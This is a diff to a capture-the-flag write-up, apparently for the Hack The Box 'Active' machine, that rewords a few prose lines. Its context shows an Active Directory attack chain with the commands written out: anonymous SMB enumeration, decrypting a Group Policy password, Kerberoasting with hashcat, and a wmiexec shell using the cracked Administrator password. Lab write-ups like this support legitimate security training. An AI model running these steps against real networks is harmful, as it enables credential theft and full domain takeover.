@@ -68,7 +68,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-Anonymous login on SMB exposed a readable **Replication** share:
+Anonymous SMB login exposed a readable **Replication** share:
 
 ```sh
 nxc smb 10.129.34.60 -u '' -p '' --shares
@@ -157,7 +157,7 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
 
 `active.htb\SVC_TGS : GPPstillStandingStrong2k18`
 
-Re-authenticated with the recovered account — the **Users** share was now readable:
+Re-authenticating with the recovered account opened up the **Users** share:
 
 ```sh
 nxc smb 10.129.34.60 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
@@ -192,7 +192,7 @@ Accounts with a ServicePrincipalName stand out over LDAP:
 ldapsearch -x -H ldap://10.129.35.211 -D 'ACTIVE\SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "CN=Users,DC=active,DC=htb"
 ```
 
-The Administrator account held the privilege.
+The Administrator account was the one carrying an SPN.
 
 > Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service.
 
@@ -212,7 +212,7 @@ hashcat -a 0 -m 13100 admin-hash /usr/share/wordlists/rockyou.txt
 
 `Administrator : Ticketmaster1968`
 
-Either log in over SMB for the root flag, or use wmiexec for a semi-interactive shell over RPC:
+With the Administrator hash cracked, it was a choice between logging in over SMB for the root flag or using wmiexec for a semi-interactive shell over RPC:
 
 ```sh
 impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.35.217 -shell-type powershell
